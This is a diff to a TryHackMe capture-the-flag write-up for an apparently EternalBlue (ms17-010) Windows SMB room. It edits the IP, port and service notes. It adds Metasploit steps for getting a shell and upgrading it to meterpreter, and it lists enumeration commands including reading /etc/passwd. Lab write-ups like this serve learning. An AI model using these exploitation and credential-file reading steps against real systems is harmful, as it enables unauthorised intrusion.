@@ -2,7 +2,7 @@
 
 ## Basic Info
 - **Platform**: TryHackMe
-- **IP Address**: 10.10.63.213
+- **IP Address**: 10.10.5.87
 - **Date**: 05/03/2025
 - **Difficulty**: Easy
 - **Tags**: Enumeration, Exploitation, Privilege Escalation
@@ -65,7 +65,7 @@ Host script results:
 
 ## Service Analysis
 
-### Port 80 - HTTP
+### Port 445 - SMB
 - **What’s running:** Microsoft Windows RPC
 - **Interesting files/directories:** 
 - **Vulnerabilities identified:** ms17-010
@@ -81,8 +81,6 @@ Host script results:
 
 **Commands:**
 ```bash
-python3 exploit.py <target>
-```
 mfsconsole - to start MetaSploit
 	set the RHOST to <targetip>
 	set the LHOST to <hackermachine>
@@ -94,10 +92,14 @@ mfsconsole - to start MetaSploit
 
 ```bash
 CTRL+Z to background the shell
-Then ran "search shell_to_meterpreter"
+Then ran "search shell_to_meterpreter" - to have a stable meterpreter session
 use 0 - to choose the exploit
 sessions -l - to list the shells that we have.
 set session 1
+run
+```
+
+```bash
 
 ```
 
@@ -105,7 +107,6 @@ set session 1
 
 ### User Enumeration
 ```bash
-whoami
 id
 cat /etc/passwd
 ```
